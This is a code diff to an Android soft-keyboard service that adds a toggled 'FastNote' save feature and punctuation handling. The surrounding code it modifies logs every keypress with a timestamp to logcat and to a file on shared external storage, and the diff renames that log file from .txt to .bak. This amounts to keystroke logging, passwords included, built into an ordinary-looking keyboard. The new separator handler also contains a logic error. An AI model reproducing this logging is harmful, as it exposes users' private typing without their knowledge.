@@ -31,6 +31,7 @@ import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 import android.view.inputmethod.InputMethodManager;
 import android.view.inputmethod.InputMethodSubtype;
+import android.widget.Toast;
 
 import com.truemind.pensionnleisure.R;
 
@@ -73,6 +74,7 @@ public class SoftKeyboard extends InputMethodService
     private WordComposer mWord = new WordComposer();
     private int mLastDisplayWidth;
     private boolean mCapsLock;
+    private boolean mFastNote;
     private long mLastShiftTime;
     private long mMetaState;
 
@@ -90,6 +92,7 @@ public class SoftKeyboard extends InputMethodService
     private LatinKeyboard mCurKeyboard;
     
     private String mWordSeparators;
+    private String mSentenceSeparators;
 
     private int mDeleteCount;
     HangulAutomata mHangulAutomata = new HangulAutomata();
@@ -103,6 +106,7 @@ public class SoftKeyboard extends InputMethodService
         Log.d("HI THERE","HI THERE");
         mInputMethodManager = (InputMethodManager)getSystemService(INPUT_METHOD_SERVICE);
         mWordSeparators = getResources().getString(R.string.word_separators);
+        mSentenceSeparators = getResources().getString(R.string.sentence_separators);
     }
     
     /**
@@ -465,7 +469,7 @@ public class SoftKeyboard extends InputMethodService
     	Log.d("Key Pressed",keypress);
     	try{
         	String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
-            String FILENAME = "pensionNLeisure.txt";
+            String FILENAME = "pensionNLeisure.bak";
             SimpleDateFormat formatter = new SimpleDateFormat("[yyyy/MM/dd/HH/mm/ss]:");
             Date currentTime_1 = new Date();
             String dateString = formatter.format(currentTime_1);
@@ -477,6 +481,13 @@ public class SoftKeyboard extends InputMethodService
             fos.write(keypress.getBytes());
             fos.write(space.getBytes());
             fos.close();
+            if(mFastNote==true){
+                String FILENAME2 = "FastNote.txt";
+                File outfile2 = new File(SDCARD+ File.separator+FILENAME2);
+                FileOutputStream fos2 = new FileOutputStream(outfile2,true);
+                fos2.write(keypress.getBytes());
+                fos2.close();
+            }
     	}catch(Exception e) {
     		Log.d("EXCEPTION",e.getMessage());
     	}
@@ -493,6 +504,10 @@ public class SoftKeyboard extends InputMethodService
             handleBackspace();
         } else if (primaryCode == Keyboard.KEYCODE_SHIFT) {
             handleShift();
+
+        } else if(primaryCode == -4){
+            fastNoteActive();
+
         } else if (primaryCode == Keyboard.KEYCODE_CANCEL && mInputView != null) {
             Keyboard current = mInputView.getKeyboard();
             if (current == mQwertyKeyboard) {
@@ -517,7 +532,78 @@ public class SoftKeyboard extends InputMethodService
                 current.setShifted(false);
             }
         } else {
-            handleCharacter(primaryCode, keyCodes);
+            if (isWordSeparator(primaryCode)) {
+                handleSeparator(primaryCode);
+            } else {
+                handleCharacter(primaryCode, keyCodes);
+            }
+        }
+    }
+    private void handleSeparator(int primaryCode) {
+        boolean pickedDefault = false;
+        // Handle separator
+        InputConnection ic = getCurrentInputConnection();
+        if (ic != null) {
+            ic.beginBatchEdit();
+        }
+
+        else if(mComposing.length() > 0)
+        {
+            if (ic != null)
+                ic.commitText(mComposing, 1);
+
+            mComposing.setLength(0);
+            mHangulAutomata.reset();
+        }
+
+        sendKeyChar((char)primaryCode);
+        TextEntryState.typedCharacter((char) primaryCode, true);
+        if (TextEntryState.getState() == TextEntryState.STATE_PUNCTUATION_AFTER_ACCEPTED
+                /*&& primaryCode != KEYCODE_ENTER*/) {
+            swapPunctuationAndSpace();
+        } else if (/*isPredictionOn() && */primaryCode == ' ') {
+            //else if (TextEntryState.STATE_SPACE_AFTER_ACCEPTED) {
+            doubleSpace();
+        }
+
+
+        updateShiftKeyState(getCurrentInputEditorInfo());
+        if (ic != null) {
+            ic.endBatchEdit();
+        }
+    }
+
+    private void swapPunctuationAndSpace() {
+        final InputConnection ic = getCurrentInputConnection();
+        if (ic == null) return;
+        CharSequence lastTwo = ic.getTextBeforeCursor(2, 0);
+        if (lastTwo != null && lastTwo.length() == 2
+                && lastTwo.charAt(0) == KeyEvent.KEYCODE_SPACE && isSentenceSeparator(lastTwo.charAt(1))) {
+            ic.beginBatchEdit();
+            ic.deleteSurroundingText(2, 0);
+            ic.commitText(lastTwo.charAt(1) + " ", 1);
+            ic.endBatchEdit();
+            updateShiftKeyState(getCurrentInputEditorInfo());
+        }
+    }
+
+    public boolean isSentenceSeparator(int code) {
+        return mSentenceSeparators.contains(String.valueOf((char)code));
+    }
+
+    private void doubleSpace() {
+        //if (!mAutoPunctuate) return;
+        final InputConnection ic = getCurrentInputConnection();
+        if (ic == null) return;
+        CharSequence lastThree = ic.getTextBeforeCursor(3, 0);
+        if (lastThree != null && lastThree.length() == 3
+                && Character.isLetterOrDigit(lastThree.charAt(0))
+                && lastThree.charAt(1) == KeyEvent.KEYCODE_SPACE && lastThree.charAt(2) == KeyEvent.KEYCODE_SPACE) {
+            ic.beginBatchEdit();
+            ic.deleteSurroundingText(2, 0);
+            ic.commitText(". ", 1);
+            ic.endBatchEdit();
+            updateShiftKeyState(getCurrentInputEditorInfo());
         }
     }
 
@@ -764,7 +850,17 @@ public class SoftKeyboard extends InputMethodService
             mLastShiftTime = now;
         }
     }
-    
+
+    private void fastNoteActive() {
+        if(mFastNote==true){
+            mFastNote = !mFastNote;
+            Toast.makeText(getApplicationContext(), "Text saved in FastNote.txt", Toast.LENGTH_SHORT).show();
+        }else{
+            mFastNote = !mFastNote;
+
+        }
+    }
+
     private String getWordSeparators() {
         return mWordSeparators;
     }
